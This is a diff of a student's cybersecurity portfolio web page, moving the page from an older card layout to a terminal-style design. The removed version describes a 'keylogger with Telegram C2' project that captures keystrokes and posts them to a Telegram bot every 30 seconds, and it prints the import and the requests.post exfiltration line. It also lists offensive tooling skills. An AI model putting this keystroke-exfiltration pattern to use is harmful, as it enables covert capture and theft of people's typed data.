@@ -1,789 +1,875 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Pratik Adhikari · Ethical Hacker Portfolio</title>
-  <!-- Font Awesome -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <!-- Google Fonts -->
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Pratik Adhikari — cybersecurity enthusiast, ethical hacker in training, and web application pentester.">
+  <title>Pratik Adhikari :: Cybersecurity Portfolio</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
+    :root {
+      --bg: #080b0e;
+      --panel: #0d1217;
+      --panel-2: #111820;
+      --line: #20303a;
+      --text: #d8e4e7;
+      --muted: #8da2a8;
+      --green: #00ff9c;
+      --cyan: #00e5ff;
+      --red: #ff7777;
+      --yellow: #f1d36b;
+      --soft-green: rgba(0, 255, 156, .075);
+      --soft-red: rgba(255, 80, 80, .105);
+      --soft-yellow: rgba(255, 215, 0, .085);
+      --max: 1180px;
     }
+
+    * { box-sizing: border-box; }
+
+    html { scroll-behavior: smooth; }
 
     body {
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-      background: #0a0e17;
-      color: #e0e6f0;
-      line-height: 1.6;
+      margin: 0;
+      color: var(--text);
+      background:
+        radial-gradient(circle at 75% 0%, rgba(0, 229, 255, .045), transparent 30rem),
+        var(--bg);
+      font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+      line-height: 1.7;
     }
 
-    /* scrollbar */
-    ::-webkit-scrollbar { width: 8px; }
-    ::-webkit-scrollbar-track { background: #0a0e17; }
-    ::-webkit-scrollbar-thumb { background: #00ff9d; border-radius: 8px; }
+    a {
+      color: var(--cyan);
+      text-decoration: none;
+      border-bottom: 1px solid transparent;
+    }
 
-    .container {
-      max-width: 1200px;
+    a:hover {
+      color: var(--green);
+      border-bottom-color: currentColor;
+    }
+
+    .shell {
+      width: min(calc(100% - 2rem), var(--max));
       margin: 0 auto;
-      padding: 20px;
     }
 
-    /* ===== HERO / PROFILE ===== */
+    .topbar {
+      position: sticky;
+      top: 0;
+      z-index: 10;
+      border-bottom: 1px solid rgba(0, 255, 156, .18);
+      background: rgba(8, 11, 14, .96);
+    }
+
+    .topbar-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 1rem;
+      min-height: 4.1rem;
+    }
+
+    .brand {
+      color: var(--green);
+      font-size: .86rem;
+      white-space: nowrap;
+    }
+
+    .brand::before { content: "./"; color: var(--muted); }
+
+    nav {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: flex-end;
+      gap: .25rem .8rem;
+    }
+
+    nav a {
+      color: var(--muted);
+      font-size: .77rem;
+      letter-spacing: .05em;
+      text-transform: uppercase;
+    }
+
+    nav a::before { content: "#"; color: var(--green); }
+
     .hero {
+      display: grid;
+      grid-template-columns: 1.05fr .95fr;
+      align-items: center;
+      gap: clamp(2rem, 6vw, 6rem);
+      min-height: 38rem;
+      padding: 5rem 0 4.5rem;
+    }
+
+    .prompt {
+      margin: 0 0 1.25rem;
+      color: var(--green);
+      font-size: .9rem;
+    }
+
+    .prompt span { color: var(--muted); }
+
+    h1, h2, h3, p { margin-top: 0; }
+
+    h1 {
+      max-width: 11ch;
+      margin-bottom: 1rem;
+      color: #f1fbfb;
+      font-size: clamp(2.5rem, 7vw, 5.8rem);
+      line-height: .98;
+      letter-spacing: -.08em;
+    }
+
+    .hero-title {
+      max-width: 40rem;
+      margin-bottom: 1.25rem;
+      color: var(--cyan);
+      font-size: clamp(1rem, 2.2vw, 1.35rem);
+      line-height: 1.45;
+    }
+
+    .hero-copy {
+      max-width: 42rem;
+      color: var(--muted);
+      font-size: .95rem;
+    }
+
+    .hero-actions {
       display: flex;
       flex-wrap: wrap;
-      align-items: center;
-      gap: 40px;
-      padding: 40px 30px;
-      background: linear-gradient(145deg, #0f1a2b, #0b1420);
-      border-radius: 28px;
-      border: 1px solid #1e2d44;
-      box-shadow: 0 0 40px rgba(0, 255, 157, 0.05);
-      margin-bottom: 40px;
-      position: relative;
-      overflow: hidden;
+      gap: .75rem;
+      margin-top: 2rem;
     }
 
-    .hero::before {
-      content: '';
-      position: absolute;
-      top: -50%;
-      right: -20%;
-      width: 400px;
-      height: 400px;
-      background: radial-gradient(circle, rgba(0, 255, 157, 0.06), transparent 70%);
-      border-radius: 50%;
-      pointer-events: none;
-    }
-
-    /* photo upload placeholder */
-    .photo-wrapper {
-      flex-shrink: 0;
-      width: 180px;
-      height: 180px;
-      border-radius: 50%;
-      background: #0d1624;
-      border: 3px dashed #00ff9d;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      position: relative;
-      overflow: hidden;
-      box-shadow: 0 0 30px rgba(0, 255, 157, 0.15);
-    }
-
-    .photo-wrapper:hover {
-      border-color: #7b2ffc;
-      box-shadow: 0 0 40px rgba(123, 47, 252, 0.25);
-    }
-
-    .photo-wrapper i {
-      font-size: 3rem;
-      color: #00ff9d;
-      opacity: 0.6;
-      margin-bottom: 6px;
-    }
-
-    .photo-wrapper span {
-      font-size: 0.7rem;
-      color: #8899bb;
-      letter-spacing: 1px;
-      text-transform: uppercase;
-    }
-
-    .photo-wrapper input[type="file"] {
-      position: absolute;
-      inset: 0;
-      opacity: 0;
-      cursor: pointer;
-    }
-
-    .photo-wrapper img {
-      position: absolute;
-      inset: 0;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      display: none;
-    }
-
-    /* hero text */
-    .hero-text {
-      flex: 1;
-      min-width: 280px;
-      z-index: 1;
-    }
-
-    .hero-text .greeting {
-      font-size: 0.9rem;
-      color: #00ff9d;
-      letter-spacing: 2px;
-      text-transform: uppercase;
-      font-weight: 600;
-      margin-bottom: 6px;
-    }
-
-    .hero-text h1 {
-      font-size: 3rem;
-      font-weight: 800;
-      letter-spacing: -0.5px;
-      background: linear-gradient(135deg, #ffffff 40%, #00ff9d);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      margin-bottom: 6px;
-    }
-
-    .hero-text .title {
-      font-size: 1.3rem;
-      color: #aabbdd;
-      font-weight: 400;
-      margin-bottom: 14px;
-    }
-
-    .hero-text .title i {
-      color: #00ff9d;
-      margin-right: 8px;
-    }
-
-    .hero-text .tagline {
-      font-size: 1rem;
-      color: #8899bb;
-      max-width: 600px;
-      margin-bottom: 18px;
-    }
-
-    .hero-badges {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-    }
-
-    .hero-badges .badge {
-      background: rgba(0, 255, 157, 0.08);
-      border: 1px solid rgba(0, 255, 157, 0.2);
-      color: #00ff9d;
-      padding: 6px 16px;
-      border-radius: 30px;
-      font-size: 0.8rem;
-      font-weight: 500;
+    .button {
       display: inline-flex;
       align-items: center;
-      gap: 6px;
+      min-height: 2.8rem;
+      padding: .65rem 1rem;
+      border: 1px solid var(--green);
+      color: var(--green);
+      font-size: .78rem;
+      letter-spacing: .04em;
+      text-transform: uppercase;
     }
 
-    .hero-badges .badge i {
-      font-size: 0.9rem;
+    .button.secondary {
+      border-color: var(--line);
+      color: var(--muted);
     }
 
-    /* ===== SECTIONS ===== */
-    section {
-      margin-bottom: 45px;
+    .button:hover {
+      border-color: var(--cyan);
+      color: var(--cyan);
+      background: rgba(0, 229, 255, .06);
     }
 
-    .section-header {
+    .portrait-wrap {
+      justify-self: center;
+      width: min(100%, 25rem);
+      padding: .7rem;
+      border: 1px solid rgba(0, 255, 156, .5);
+      background: rgba(0, 255, 156, .035);
+      box-shadow: 0 0 0 .55rem rgba(0, 255, 156, .04), 0 0 2.5rem rgba(0, 229, 255, .11);
+    }
+
+    .portrait {
+      display: block;
+      width: 100%;
+      aspect-ratio: 1 / 1;
+      object-fit: cover;
+      border: 1px solid rgba(0, 229, 255, .6);
+      filter: saturate(.8) contrast(1.05);
+    }
+
+    .portrait-caption {
       display: flex;
-      align-items: center;
-      gap: 14px;
-      margin-bottom: 22px;
+      justify-content: space-between;
+      gap: .5rem;
+      padding: .7rem .2rem .05rem;
+      color: var(--muted);
+      font-size: .7rem;
     }
 
-    .section-header i {
-      font-size: 1.6rem;
-      color: #00ff9d;
-      width: 2rem;
-      text-align: center;
+    .online { color: var(--green); }
+
+    .section {
+      padding: 5rem 0;
+      border-top: 1px solid var(--line);
     }
 
-    .section-header h2 {
-      font-size: 1.7rem;
-      font-weight: 700;
-      letter-spacing: -0.3px;
-      color: #e0e6f0;
+    .section-heading {
+      display: flex;
+      align-items: baseline;
+      gap: 1rem;
+      margin-bottom: 2rem;
     }
 
-    .section-header .line {
-      flex: 1;
-      height: 1px;
-      background: linear-gradient(90deg, #1e2d44, transparent);
-      margin-left: 10px;
+    .section-number {
+      color: var(--green);
+      font-size: .8rem;
     }
 
-    /* qualification card */
-    .qual-card {
-      background: linear-gradient(145deg, #0f1a2b, #0b1420);
-      border-radius: 18px;
-      padding: 28px 30px;
-      border: 1px solid #1e2d44;
+    h2 {
+      margin-bottom: 0;
+      color: #effafa;
+      font-size: clamp(1.5rem, 3vw, 2.25rem);
+      letter-spacing: .08em;
+      text-transform: uppercase;
+    }
+
+    h2::after {
+      content: "_";
+      color: var(--green);
+    }
+
+    h3 {
+      margin-bottom: .45rem;
+      color: #f2fbfb;
+      font-size: 1.03rem;
+      line-height: 1.4;
+    }
+
+    .lede {
+      max-width: 52rem;
+      margin-bottom: 2.2rem;
+      color: var(--muted);
+    }
+
+    .about-grid {
+      display: grid;
+      grid-template-columns: 1.35fr .65fr;
+      gap: 1.25rem;
+    }
+
+    .panel {
+      border: 1px solid var(--line);
+      background: linear-gradient(135deg, rgba(255, 255, 255, .025), transparent 65%), var(--panel);
+      padding: 1.35rem;
+    }
+
+    .terminal-line {
+      margin-bottom: .9rem;
+      color: var(--green);
+      font-size: .8rem;
+    }
+
+    .terminal-line span { color: var(--muted); }
+
+    .about-copy {
+      color: #bac9cc;
+      font-size: .91rem;
+    }
+
+    .about-copy:last-child { margin-bottom: 0; }
+
+    .stat-list {
+      display: grid;
+      gap: .8rem;
+      margin: 0;
+    }
+
+    .stat {
+      padding-bottom: .8rem;
+      border-bottom: 1px solid var(--line);
+    }
+
+    .stat:last-child { padding-bottom: 0; border-bottom: 0; }
+
+    .stat dt {
+      color: var(--muted);
+      font-size: .7rem;
+      letter-spacing: .08em;
+      text-transform: uppercase;
+    }
+
+    .stat dd {
+      margin: .15rem 0 0;
+      color: var(--cyan);
+      font-size: .9rem;
+    }
+
+    .rank-legend {
       display: flex;
       flex-wrap: wrap;
-      gap: 30px;
-      align-items: center;
+      gap: .5rem 1rem;
+      margin: 0 0 1.5rem;
+      color: var(--muted);
+      font-size: .7rem;
+      text-transform: uppercase;
     }
 
-    .qual-card .qual-icon {
-      width: 64px;
-      height: 64px;
-      border-radius: 16px;
-      background: rgba(0, 255, 157, 0.08);
-      border: 1px solid rgba(0, 255, 157, 0.15);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1.8rem;
-      color: #00ff9d;
-      flex-shrink: 0;
+    .legend-item::before,
+    .rank-badge::before {
+      content: "";
+      display: inline-block;
+      width: .45rem;
+      height: .45rem;
+      margin-right: .45rem;
+      border-radius: 50%;
+      background: currentColor;
+      vertical-align: .05em;
     }
 
-    .qual-card .qual-text {
-      flex: 1;
-      min-width: 200px;
-    }
+    .legend-best, .rank-best .rank-badge { color: var(--red); }
+    .legend-medium, .rank-medium .rank-badge { color: var(--yellow); }
+    .legend-low, .rank-low .rank-badge { color: var(--green); }
 
-    .qual-card .qual-text h3 {
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: #ffffff;
-      margin-bottom: 4px;
-    }
-
-    .qual-card .qual-text p {
-      color: #8899bb;
-      font-size: 0.95rem;
-    }
-
-    .qual-card .qual-text .sub {
-      color: #00ff9d;
-      font-size: 0.85rem;
-      font-weight: 500;
-    }
-
-    /* skills grid */
-    .skills-grid {
+    .skill-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
-      gap: 18px;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 1rem;
     }
 
-    .skill-category {
-      background: linear-gradient(145deg, #0f1a2b, #0b1420);
-      border-radius: 16px;
-      padding: 22px;
-      border: 1px solid #1e2d44;
-      transition: all 0.3s ease;
-    }
-
-    .skill-category:hover {
-      border-color: rgba(0, 255, 157, 0.3);
-      box-shadow: 0 8px 28px rgba(0, 255, 157, 0.04);
-      transform: translateY(-3px);
-    }
-
-    .skill-category h3 {
-      font-size: 1rem;
-      font-weight: 600;
-      color: #00ff9d;
-      margin-bottom: 14px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    .skill-category h3 i {
-      font-size: 1.1rem;
-      width: 24px;
-      color: #7b2ffc;
-    }
-
-    .skill-category ul {
-      list-style: none;
-      padding: 0;
-    }
-
-    .skill-category ul li {
-      font-size: 0.9rem;
-      color: #b0c4dd;
-      padding: 4px 0 4px 18px;
+    .rank-card {
       position: relative;
+      border: 1px solid var(--line);
+      border-left-width: 3px;
+      padding: 1.25rem;
+      background: var(--panel);
     }
 
-    .skill-category ul li::before {
-      content: '▹';
+    .rank-card:hover {
+      border-color: rgba(0, 229, 255, .5);
+      box-shadow: 0 0 1.3rem rgba(0, 229, 255, .06);
+    }
+
+    .rank-best {
+      border-left-color: var(--red);
+      background: linear-gradient(90deg, var(--soft-red), transparent 70%), var(--panel);
+    }
+
+    .rank-medium {
+      border-left-color: var(--yellow);
+      background: linear-gradient(90deg, var(--soft-yellow), transparent 70%), var(--panel);
+    }
+
+    .rank-low {
+      border-left-color: var(--green);
+      background: linear-gradient(90deg, var(--soft-green), transparent 70%), var(--panel);
+    }
+
+    .rank-badge {
       position: absolute;
-      left: 0;
-      color: #00ff9d;
-      font-size: 0.9rem;
+      top: 1rem;
+      right: 1rem;
+      font-size: .63rem;
+      letter-spacing: .09em;
+      text-transform: uppercase;
     }
 
-    /* projects */
-    .projects-grid {
+    .skill-group h3 { padding-right: 4rem; }
+
+    .tags {
+      display: flex;
+      flex-wrap: wrap;
+      gap: .45rem;
+      margin: 1rem 0 0;
+    }
+
+    .tag {
+      padding: .25rem .48rem;
+      border: 1px solid rgba(141, 162, 168, .28);
+      color: #b5c8cb;
+      font-size: .72rem;
+      line-height: 1.35;
+    }
+
+    .tag:hover { border-color: var(--cyan); color: var(--cyan); }
+
+    .card-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-      gap: 20px;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 1rem;
     }
 
     .project-card {
-      background: linear-gradient(145deg, #0f1a2b, #0b1420);
-      border-radius: 16px;
-      padding: 24px;
-      border: 1px solid #1e2d44;
-      border-left: 3px solid #00ff9d;
-      transition: all 0.3s ease;
+      min-height: 100%;
+      padding: 1.5rem;
     }
 
-    .project-card:hover {
-      border-left-color: #7b2ffc;
-      border-color: #1e2d44;
-      border-left-color: #7b2ffc;
-      transform: translateY(-3px);
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    .project-card h3 { max-width: 75%; }
+
+    .project-card p,
+    .project-card li,
+    .journey-card p {
+      color: var(--muted);
+      font-size: .84rem;
     }
 
-    .project-card .project-icon {
-      font-size: 1.8rem;
-      margin-bottom: 10px;
-      color: #00ff9d;
+    .label {
+      margin: 1.15rem 0 .35rem;
+      color: var(--green);
+      font-size: .68rem;
+      letter-spacing: .12em;
+      text-transform: uppercase;
     }
 
-    .project-card h3 {
-      font-size: 1.05rem;
-      font-weight: 600;
-      color: #ffffff;
-      margin-bottom: 4px;
+    ul {
+      margin: .45rem 0 0;
+      padding-left: 1.2rem;
     }
 
-    .project-card .tech {
-      font-size: 0.78rem;
-      color: #8899bb;
-      letter-spacing: 0.3px;
-      margin-bottom: 8px;
-      display: flex;
-      flex-wrap: wrap;
-      gap: 4px;
+    li::marker { color: var(--green); }
+
+    .journey {
+      display: grid;
+      gap: 1rem;
     }
 
-    .project-card .tech span {
-      background: rgba(123, 47, 252, 0.12);
-      border: 1px solid rgba(123, 47, 252, 0.15);
-      padding: 2px 10px;
-      border-radius: 20px;
-      font-size: 0.72rem;
-      color: #b8a0f0;
+    .journey-card {
+      display: grid;
+      grid-template-columns: 10rem 1fr;
+      gap: 1.5rem;
+      padding: 1.35rem 1.5rem;
     }
 
-    .project-card p {
-      font-size: 0.9rem;
-      color: #b0c4dd;
+    .journey-date {
+      color: var(--cyan);
+      font-size: .83rem;
+      text-transform: uppercase;
     }
 
-    .project-card .code-line {
-      background: #0a0e17;
-      border: 1px solid #1a2a40;
-      border-radius: 8px;
-      padding: 10px 14px;
-      font-family: 'Courier New', monospace;
-      font-size: 0.78rem;
-      color: #8af0c0;
-      margin-top: 10px;
-      overflow-x: auto;
+    .journey-stage {
+      margin-top: .25rem;
+      color: var(--text);
+      font-size: .95rem;
     }
 
-    /* toolchain */
-    .toolchain {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-      background: linear-gradient(145deg, #0f1a2b, #0b1420);
-      border-radius: 16px;
-      padding: 22px 24px;
-      border: 1px solid #1e2d44;
+    .cert-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 1rem;
     }
 
-    .toolchain .tag {
-      background: rgba(0, 255, 157, 0.06);
-      border: 1px solid rgba(0, 255, 157, 0.12);
-      color: #aabbdd;
-      padding: 5px 16px;
-      border-radius: 30px;
-      font-size: 0.82rem;
-      font-weight: 500;
-      transition: all 0.2s ease;
+    .cert-card { min-height: 12rem; }
+
+    .cert-state {
+      display: inline-block;
+      margin-top: 1.3rem;
+      padding: .2rem .45rem;
+      border: 1px solid currentColor;
+      color: var(--yellow);
+      font-size: .65rem;
+      letter-spacing: .08em;
+      text-transform: uppercase;
     }
 
-    .toolchain .tag:hover {
-      border-color: #00ff9d;
-      color: #00ff9d;
-      background: rgba(0, 255, 157, 0.08);
+    .education-grid,
+    .contact-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
     }
 
-    /* contact */
-    .contact-card {
-      background: linear-gradient(145deg, #0f1a2b, #0b1420);
-      border-radius: 18px;
-      padding: 32px 30px;
-      border: 1px solid #1e2d44;
-      text-align: center;
-    }
-
-    .contact-card p {
-      color: #aabbdd;
-      margin-bottom: 18px;
+    .education-title {
+      color: var(--cyan);
       font-size: 1rem;
     }
 
-    .contact-links {
+    .muted { color: var(--muted); }
+
+    .contact-list {
+      display: grid;
+      gap: .8rem;
+      margin: 0;
+      padding: 0;
+      list-style: none;
+    }
+
+    .contact-list li {
       display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 30px;
+      justify-content: space-between;
+      gap: 1rem;
+      padding-bottom: .7rem;
+      border-bottom: 1px solid var(--line);
+      color: var(--muted);
+      font-size: .83rem;
     }
 
-    .contact-links a {
-      color: #e0e6f0;
-      text-decoration: none;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-size: 0.95rem;
-      padding: 8px 18px;
-      border-radius: 40px;
-      border: 1px solid #1e2d44;
-      transition: all 0.3s ease;
+    .contact-list li::marker { content: none; }
+
+    footer {
+      padding: 2.5rem 0 3rem;
+      border-top: 1px solid var(--line);
+      color: var(--muted);
+      font-size: .8rem;
     }
 
-    .contact-links a i {
-      color: #00ff9d;
-      font-size: 1.2rem;
+    footer strong { color: var(--green); font-weight: 400; }
+
+    @media (max-width: 900px) {
+      .hero,
+      .about-grid { grid-template-columns: 1fr; }
+      .hero { min-height: auto; padding-top: 4rem; }
+      .portrait-wrap { order: -1; width: min(18rem, 80vw); }
+      .skill-grid { grid-template-columns: repeat(2, 1fr); }
+      .cert-grid { grid-template-columns: repeat(2, 1fr); }
     }
 
-    .contact-links a:hover {
-      border-color: #00ff9d;
-      background: rgba(0, 255, 157, 0.04);
-      transform: translateY(-2px);
-    }
-
-    /* footer */
-    .footer {
-      text-align: center;
-      padding: 30px 0 20px;
-      border-top: 1px solid #1e2d44;
-      margin-top: 20px;
-      color: #556688;
-      font-size: 0.85rem;
-    }
-
-    .footer .terminal {
-      font-family: 'Courier New', monospace;
-      color: #00ff9d;
-      font-size: 0.8rem;
-      display: inline-block;
-      background: #0a0e17;
-      padding: 6px 18px;
-      border-radius: 20px;
-      border: 1px solid #1a2a40;
-      margin-bottom: 12px;
-    }
-
-    .footer .terminal .blink {
-      animation: blink 1s step-end infinite;
-    }
-
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0; }
-    }
-
-    /* responsive */
-    @media (max-width: 700px) {
-      .hero {
-        flex-direction: column;
-        text-align: center;
-        padding: 30px 20px;
-      }
-      .hero-text h1 { font-size: 2.2rem; }
-      .hero-text .tagline { margin-left: auto; margin-right: auto; }
-      .hero-badges { justify-content: center; }
-      .photo-wrapper { width: 140px; height: 140px; }
-      .photo-wrapper i { font-size: 2.2rem; }
-      .section-header h2 { font-size: 1.3rem; }
-      .qual-card { flex-direction: column; text-align: center; }
-      .contact-links { flex-direction: column; align-items: center; gap: 12px; }
+    @media (max-width: 620px) {
+      .shell { width: min(calc(100% - 1.25rem), var(--max)); }
+      .topbar-inner { align-items: flex-start; flex-direction: column; padding: .9rem 0; }
+      nav { justify-content: flex-start; gap: .15rem .65rem; }
+      nav a { font-size: .68rem; }
+      .hero { padding: 3rem 0; }
+      h1 { font-size: clamp(2.6rem, 16vw, 4.5rem); }
+      .section { padding: 3.5rem 0; }
+      .skill-grid,
+      .card-grid,
+      .cert-grid,
+      .education-grid,
+      .contact-grid { grid-template-columns: 1fr; }
+      .journey-card { grid-template-columns: 1fr; gap: .35rem; }
+      .contact-list li { align-items: flex-start; flex-direction: column; gap: .2rem; }
     }
   </style>
 </head>
 <body>
-
-<div class="container">
-
-  <!-- ===== HERO WITH PHOTO UPLOAD ===== -->
-  <header class="hero">
-    <!-- PHOTO UPLOAD PLACEHOLDER -->
-    <div class="photo-wrapper" style="border-style: solid; border-color: #00ff9d; cursor: default;">
-  <img src="./profile.jpeg" alt="Pratik Adhikari" 
-       style="display: block; width: 100%; height: 100%; object-fit: cover;">
-</div>
-
-    <div class="hero-text">
-      <div class="greeting"><i class="fas fa-terminal"></i> whoami</div>
-      <h1>Pratik Adhikari</h1>
-      <div class="title"><i class="fas fa-shield-alt"></i> Ethical Hacker · Penetration Tester</div>
-      <p class="tagline">
-        IT student & hands-on security practitioner. I break, build, and secure systems —
-        from CTF boxes on TryHackMe and HackTheBox to real VPN deployments and Python automation.
-      </p>
-      <div class="hero-badges">
-        <span class="badge"><i class="fas fa-crosshairs"></i> Pentesting</span>
-        <span class="badge"><i class="fas fa-network-wired"></i> Networking</span>
-        <span class="badge"><i class="fab fa-linux"></i> Kali / Ubuntu</span>
-        <span class="badge"><i class="fab fa-python"></i> Python</span>
-        <span class="badge"><i class="fas fa-bug"></i> CTF</span>
-        <span class="badge"><i class="fas fa-lock"></i> WireGuard</span>
-      </div>
+  <header class="topbar">
+    <div class="shell topbar-inner">
+      <a class="brand" href="#top">pratik@security:~$</a>
+      <nav aria-label="Primary navigation">
+        <a href="#about">about</a>
+        <a href="#skills">skills</a>
+        <a href="#certifications">certs</a>
+        <a href="#journey">journey</a>
+        <a href="#projects">projects</a>
+        <a href="#education">education</a>
+        <a href="#contact">contact</a>
+      </nav>
     </div>
   </header>
 
-  <!-- ===== QUALIFICATION ===== -->
-  <section>
-    <div class="section-header">
-      <i class="fas fa-graduation-cap"></i>
-      <h2>Qualification</h2>
-      <div class="line"></div>
-    </div>
-    <div class="qual-card">
-      <div class="qual-icon"><i class="fas fa-user-graduate"></i></div>
-      <div class="qual-text">
-        <h3>Bachelor's in Information Technology (IT)</h3>
-        <p class="sub">Currently Pursuing · Nepal</p>
-        <p style="margin-top:6px; color:#8899bb; font-size:0.92rem;">
-          Focused on cybersecurity, network security, and ethical hacking.
-          Actively practicing on TryHackMe & HackTheBox alongside academic coursework.
-        </p>
-      </div>
-    </div>
-  </section>
-
-  <!-- ===== SKILLS ===== -->
-  <section>
-    <div class="section-header">
-      <i class="fas fa-code"></i>
-      <h2>Technical Skills</h2>
-      <div class="line"></div>
-    </div>
-    <div class="skills-grid">
-      <div class="skill-category">
-        <h3><i class="fas fa-crosshairs"></i> Offensive Security</h3>
-        <ul>
-          <li>Nmap, Gobuster, Feroxbuster, enum4linux</li>
-          <li>Metasploit, SQLMap, Hydra, WPScan</li>
-          <li>Burp Suite, manual SQLi / XSS / LFI</li>
-          <li>Privilege escalation (SUID, sudo, cron)</li>
-          <li>Hashcat, John the Ripper, bcrypt cracking</li>
-        </ul>
-      </div>
-      <div class="skill-category">
-        <h3><i class="fas fa-network-wired"></i> Networking</h3>
-        <ul>
-          <li>TCP/IP, UDP, ICMP, DNS, HTTP/HTTPS</li>
-          <li>WireGuard VPN deployment & tunneling</li>
-          <li>tcpdump, Wireshark packet analysis</li>
-          <li>iptables, ufw, fail2ban hardening</li>
-          <li>Routing, NAT, SMB, LDAP, Kerberos</li>
-        </ul>
-      </div>
-      <div class="skill-category">
-        <h3><i class="fab fa-linux"></i> Systems</h3>
-        <ul>
-          <li>Kali Linux, Ubuntu Server, Debian</li>
-          <li>Bash scripting & automation</li>
-          <li>systemd, process & service management</li>
-          <li>File permissions, SUID auditing</li>
-          <li>VirtualBox, VMware, VM networking</li>
-        </ul>
-      </div>
-      <div class="skill-category">
-        <h3><i class="fab fa-python"></i> Programming</h3>
-        <ul>
-          <li>Python 3 (automation, servers, tools)</li>
-          <li>pynput, requests, ssl, http.server</li>
-          <li>Telegram Bot API integration</li>
-          <li>Wordlist / payload generation</li>
-          <li>Git, CLI tooling, Linux dev workflow</li>
-        </ul>
-      </div>
-    </div>
-  </section>
-
-  <!-- ===== PROJECTS ===== -->
-  <section>
-    <div class="section-header">
-      <i class="fas fa-flask"></i>
-      <h2>Featured Projects</h2>
-      <div class="line"></div>
-    </div>
-    <div class="projects-grid">
-
-      <div class="project-card">
-        <div class="project-icon"><i class="fas fa-lock"></i></div>
-        <h3>WireGuard VPN Tunnel — Kali ↔ Ubuntu</h3>
-        <div class="tech">
-          <span>VPN</span><span>Cryptography</span><span>Encapsulation</span>
-        </div>
-        <p>Deployed a secure WireGuard tunnel between Kali and Ubuntu VMs using public-key cryptography. Configured private IP space (10.0.0.0/24), verified ICMP over the tunnel, and observed encapsulation by capturing encrypted UDP traffic on port 51820.</p>
-        <div class="code-line">
-          <span style="color:#557788;"># On Ubuntu (server)</span><br>
-          <span style="color:#7b9fd4;">sudo wg-quick up wg0</span><br>
-          <span style="color:#557788;"># Encapsulation visible on eth0</span><br>
-          <span style="color:#7b9fd4;">sudo tcpdump -i eth0 port 51820</span>
+  <main id="top">
+    <section class="shell hero" aria-labelledby="hero-title">
+      <div>
+        <p class="prompt"><span>pratik@security: ~/portfolio</span><br>$ whoami</p>
+        <h1 id="hero-title">Pratik Adhikari</h1>
+        <p class="hero-title">Cybersecurity Enthusiast · Ethical Hacker in Training · Web App Pentester</p>
+        <p class="hero-copy">Breaking things safely in labs and authorized scopes — so the real bugs get found before someone with worse intentions do.</p>
+        <div class="hero-actions">
+          <a class="button" href="#contact">mail --to pratik</a>
+          <a class="button secondary" href="#projects">view engagements</a>
         </div>
       </div>
+      <figure class="portrait-wrap">
+        <img class="portrait" src="./profile.jpeg" alt="Profile portrait of Pratik Adhikari">
+        <figcaption class="portrait-caption">
+          <span>profile.jpeg</span>
+          <span class="online">● authorized access</span>
+        </figcaption>
+      </figure>
+    </section>
 
-      <div class="project-card">
-        <div class="project-icon"><i class="fab fa-python"></i></div>
-        <h3>Python Keylogger with Telegram C2</h3>
-        <div class="tech">
-          <span>Python</span><span>pynput</span><span>Telegram API</span>
+    <section class="section" id="about">
+      <div class="shell">
+        <div class="section-heading">
+          <span class="section-number">01</span>
+          <h2>About Me</h2>
         </div>
-        <p>Built an ethical keylogger that captures keystrokes, buffers them, and exfiltrates logs to a Telegram bot every 30 seconds. Handled special keys and added a stealth thread for periodic reporting.</p>
-        <div class="code-line">
-          <span style="color:#557788;">from pynput.keyboard import Listener, Key</span><br>
-          <span style="color:#7b9fd4;">requests.post(telegram_url, data=&#123;"chat_id": CHAT_ID, "text": log_buffer&#125;)</span>
-        </div>
-      </div>
-
-      <div class="project-card">
-        <div class="project-icon"><i class="fas fa-globe"></i></div>
-        <h3>Custom Python HTTPS Server</h3>
-        <div class="tech">
-          <span>Python</span><span>SSL/TLS</span><span>OpenSSL</span>
-        </div>
-        <p>Built a custom HTTPS server using <code>http.server</code> and <code>ssl.SSLContext</code>. Generated self-signed certs, bound to port 8443, and debugged port conflicts and process management.</p>
-        <div class="code-line">
-          <span style="color:#557788;">context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)</span><br>
-          <span style="color:#7b9fd4;">httpd.socket = context.wrap_socket(httpd.socket, server_side=True)</span>
-        </div>
-      </div>
-
-      <div class="project-card">
-        <div class="project-icon"><i class="fas fa-bug"></i></div>
-        <h3>CTF Walkthroughs — THM & HTB</h3>
-        <div class="tech">
-          <span>Pentesting</span><span>Web</span><span>PrivEsc</span><span>Forensics</span>
-        </div>
